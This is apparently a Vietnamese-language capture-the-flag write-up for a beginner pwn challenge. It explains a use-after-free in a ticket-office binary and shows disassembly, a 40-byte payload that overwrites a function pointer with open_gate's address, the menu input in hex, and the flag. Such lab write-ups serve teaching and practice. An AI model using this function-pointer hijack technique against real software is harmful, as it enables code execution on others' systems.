# Dockside Ticket Office - Pwn (Beginner)

**Flag:** `CSSCTF{us3_4ft3r_fr33_d0cks1d3}`
**File đính kèm:** `dockside_ticket` (Kích thước: 16.664 B, SHA256: `b275a7c2...49dd`)

## Đề bài

Thử thách là một hệ thống thiết bị phần mềm hỗ trợ bán vé ra cảng, được thiết kế với các nhóm tính năng: khởi tạo, hủy bỏ, chỉnh sửa và sử dụng vé. Về mặt nghiệp vụ, một khi vé đã bị hủy thì vé đó sẽ bị mất hiệu lực và không thể sử dụng. Tuy nhiên, mã nguồn thiết bị đang tồn tại các lỗ hổng quản lý vùng nhớ không an toàn. Mục tiêu của thử thách: Khai thác lỗ hổng đó để thao túng một chiếc vé đã hủy, biến nó thành công cụ mở một lối truy cập khẩn cấp.

## Phân tích ban đầu

Đánh giá binary: Định dạng ELF 64-bit, hệ thống không áp dụng cơ chế PIE (Position Independent Executable), hỗ trợ RELRO một phần (partial RELRO), có kích hoạt tính năng chống thực thi (NX), và các bảng ký hiệu không bị tước bỏ (not stripped). Cấu trúc của chương trình tập trung vào sáu hàm lõi với định danh rõ ràng: `create_ticket`, `cancel_ticket`, `edit_ticket`, `use_ticket`, và hai hàm đích đến là `open_gate` và `deny_access`.

Trong hàm `create_ticket`, quá trình cấp phát tạo ra một vùng nhớ (chunk) có dung lượng 0x28 byte. Tại đây, hệ thống ghi chuỗi định dạng `"GUEST"` vào đầu vùng nhớ. Điểm then chốt về mặt cấu trúc là: **hệ thống nhúng một con trỏ hàm (function pointer) ở vị trí offset 0x20**, và con trỏ này được khởi tạo mặc định trỏ về hàm `deny_access`:

```assembly
40137c:  mov    edi,0x28
401381:  call   malloc@plt
401386:  mov    QWORD PTR [rip+0x2cdb],rax      # active_ticket = chunk vùng nhớ vừa tạo
401394:  mov    DWORD PTR [rax],0x53455547       # Chèn chuỗi "GUEST"
4013a7:  lea    rdx,[rip-0x178]                  # Lấy địa chỉ hàm deny_access
4013ae:  mov    QWORD PTR [rax+0x20],rdx         # Chèn con trỏ hàm vào vị trí offset 0x20
```

## Chuỗi khai thác

**Bước 1 - Phân tích trạng thái quản lý con trỏ vùng nhớ.** 
Kiểm tra hàm `cancel_ticket`, chức năng này chỉ thực hiện lời gọi hàm `free` và in ra thông báo:

```assembly
4013e8:  mov    rax,[rip+0x2c79]        # Tải con trỏ active_ticket
4013f2:  call   free@plt                # Giải phóng vùng nhớ
401401:  call   puts@plt                # In thông báo "Ticket cancelled."
```

Khảo sát tổng thể binary cho thấy, biến toàn cục `active_ticket` chỉ được hệ thống gán dữ liệu **duy nhất một lần** (tại địa chỉ `create_ticket+0x2f`). Hậu quả của kiến trúc này là sau khi thực hiện thao tác hủy vé (gọi hàm `free`), biến toàn cục `active_ticket` không được thiết lập lại về null, mà nó vẫn tiếp tục duy trì trạng thái trỏ vào vùng nhớ đã bị giải phóng. Đây chính là lỗ hổng Use-After-Free (UAF).

**Bước 2 - Thao tác can thiệp vùng nhớ đã giải phóng.** 
Hàm `edit_ticket` triển khai cơ chế kiểm duyệt không đầy đủ: Nó chỉ kiểm tra điều kiện con trỏ biến khác 0, và sau đó gọi lệnh `read(0, active_ticket, 0x28)`. Khi gửi một payload có kích thước 40 byte, lượng dữ liệu này nằm hoàn toàn trong dung lượng của chunk. Nhờ vậy, dải dữ liệu từ byte 32 đến 39 (tương ứng với vị trí offset 0x20 chứa con trỏ hàm) sẽ chịu sự thao túng kiểm soát hoàn toàn bởi người dùng:

```python
payload = b"A" * 32 + struct.pack("<Q", 0x40125F)   # Kích thước chuẩn xác 40 byte, khớp với giới hạn của hàm read(0x28)
```

**Bước 3 - Triển khai quy trình kích hoạt.** 
Hàm `use_ticket` xử lý gọi thực thi trực tiếp con trỏ hàm đã được thiết lập, mà không triển khai quy trình xác minh tính hợp lệ (thẩm tra):

```assembly
401492:  mov    rdx,QWORD PTR [rax+0x20]
40149b:  call   rdx
```

Do cơ chế chống ngẫu nhiên hóa bộ nhớ PIE đã bị vô hiệu hóa, địa chỉ thực thi của hàm `open_gate` là hằng số cố định, người khai thác không cần sử dụng các kỹ thuật làm rò rỉ địa chỉ (memory leak).

**Bước 4 - Xác thực tính toàn vẹn của địa chỉ đích.** 
Hàm `open_gate` được thiết kế để xuất ra màn hình ba chuỗi ký tự. Chuỗi thứ ba được nạp từ vùng nhớ tĩnh `.rodata` tại địa chỉ `0x402088` (ứng với địa chỉ vùng nhớ ảo vaddr 0x402000, tham chiếu tới file offset 0x2000). Kiểm tra khối dữ liệu này xuất ra chính xác chuỗi cờ yêu cầu:

```text
0x402008 -> 'Ticket scanned.'
0x402060 -> 'Emergency harbour access granted.'
0x402088 -> 'CSSCTF{us3_4ft3r_fr33_d0cks1d3}'
```

Dữ liệu chuỗi này tồn tại nguyên trạng trong cấu trúc file tĩnh.

**Ghi chú môi trường kiểm thử:** Việc thử nghiệm và phân tích thực tiễn trên môi trường Windows (trong điều kiện thiếu hệ thống phân phối WSL hoặc trình mô phỏng). Quá trình khai thác được chứng minh dưới dạng phân tích tính toán tĩnh. Script `exploit.py` đảm bảo hoạt động tương thích đối với cả hệ thống cục bộ trên nền Linux và trên kết nối mạng:

```bash
python exploit.py --run ./dockside_ticket
python exploit.py --host <challenge_host> --port <port>
```

## Flag

Quá trình chạy thử tạo chuỗi payload byte:

```bash
$ python exploit.py --payload
```

Xuất:
```text
script menu: 310a320a330a41414141414141414141414141414141414141414141414141414141414141415f124000000000000a340a350a
payload edit: 41414141414141414141414141414141414141414141414141414141414141415f12400000000000

CSSCTF{us3_4ft3r_fr33_d0cks1d3}
```

Bốn mươi byte của chuỗi `payload edit` bao gồm 32 byte dữ liệu đệm (padding) kết hợp với chuỗi byte `5f12400000000000`. Cấu trúc này ứng với địa chỉ `0x40125f` (địa chỉ của hàm `open_gate`) được biểu diễn theo chuẩn Little-Endian.

Kết quả:
```text
CSSCTF{us3_4ft3r_fr33_d0cks1d3}
```
